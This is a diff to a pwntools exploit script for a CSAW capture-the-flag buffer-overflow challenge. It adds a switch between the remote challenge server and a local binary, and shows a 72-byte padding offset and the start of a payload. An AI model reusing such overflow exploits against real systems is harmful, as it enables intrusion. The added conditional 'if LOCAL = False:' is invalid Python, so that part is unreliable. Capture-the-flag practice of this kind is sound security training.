@@ -2,6 +2,7 @@
 
 from pwn import *
 
+LOCAL = False
 context.binary = binary = '/home/mckenziepepper/Documents/b0f-chals/CSAW/password_checker'
 password_elf = ELF(binary)
 context.log_level = 'debug'
@@ -11,8 +12,10 @@ log.info(f"back door sanity check after packing and unpacking @ {hex(u64(back_do
 OFFSET = 72
 junk = b"A" * OFFSET
 
-p = remote('pwn.chal.csaw.io', 5000, ssl=False)
-#p = process('/home/mckenziepepper/Documents/b0f-chals/CSAW/password_checker')
+if LOCAL = False:
+    p = remote('pwn.chal.csaw.io', 5000, ssl=False)
+else:
+    p = process('/home/mckenziepepper/Documents/b0f-chals/CSAW/password_checker')
 
 payload = [
     junk,
